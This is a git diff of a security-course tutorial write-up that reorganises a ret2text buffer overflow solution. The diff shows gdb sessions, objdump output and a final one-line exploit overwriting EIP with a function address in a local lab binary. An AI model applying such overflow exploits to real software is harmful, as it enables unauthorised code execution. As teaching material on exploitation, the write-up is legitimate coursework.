@@ -5,7 +5,7 @@
 **Progress**
  - [x] [6.1 Environment Configuration](#61-environment-configuration)
  - [x] [6.2 Evading Stack Protection](#62-evading-stack-protection)
- - [ ] [6.3 Breaking ASLR](#63-breaking-aslr)
+ - [x] [6.3 Breaking ASLR](#63-breaking-aslr)
 
 ## 6.1 Environment Configuration
 > This is the same at last week, but repeated so you don't forget.
@@ -220,11 +220,11 @@ This might not work for you as addresses might have changed.
 > HINT: Some solutions were presented in the lectures, or feel free to instrument the code and learn about the behaviour on your system before exploiting it.
 
 
-### Solution for `ret2text.c`
-
+### Idea :bulb:
 The idea of the `ret2text` exploit is to rewrite EIP with the address of a non randomized function that can be found in the text section of the binary.
 
-When we compile the `ret2text.c` file with `gcc` as explained we run into an issue. Indeed, a simple `objdump` on the binary gives the following :
+### Step by step :walking:
+**1. Avoiding NULL bytes** When we compile the `ret2text.c` file with `gcc` as explained we run into an issue. Indeed, a simple `objdump` on the binary gives the following :
 
 ```console
 000011f5 <secret>:
@@ -270,7 +270,7 @@ By giving a try to another compiler, here `clang`, we can obtain an injectable a
 
 The rest is the usual buffer localization and overflow, that is :
 
-**1. Finding the buffer** We put a breakpoint on the function containing the vulnerable function in order to find the saved EBP and the saved EIP, then a breakpoint before and after the vulnerable function call in order to look at the buffer while injecting code :
+**2. Finding the buffer** We put a breakpoint on the function containing the vulnerable function in order to find the saved EBP and the saved EIP, then a breakpoint before and after the vulnerable function call in order to look at the buffer while injecting code :
 
 ```console
 (gdb) disassemble main
@@ -294,7 +294,7 @@ Breakpoint 2 at 0x80491aa
 Breakpoint 3 at 0x80491af
 ```
 
-**2. Giving a try** Here we try some injections in order to deduce the location and the size of the buffer.
+**3. Giving a try** Here we try some injections in order to deduce the location and the size of the buffer.
 
 ```console
 (gdb) r $(python -c "print('\x90'*16)")
@@ -337,7 +337,8 @@ Breakpoint 3, 0x080491af in public ()
 By observing the buffer right after the injection we can see that it is quite small, our guess of 16 bytes was correct since we wrote the last byte of the saved EBP.
 The complete injection is thus composed by a padding of 20 bytes and the address of `secret`.
 
-**3. Exploit** Here is our complete exploit :
+### Final solution :running:
+Here is our complete exploit :
 
 ```console
 admin@kali:~/SecurityClass/Tutorial-06/6.3$ ./ret2text $(python -c "print('\x90'*20 + '\xd0\x91\x04\x08')")
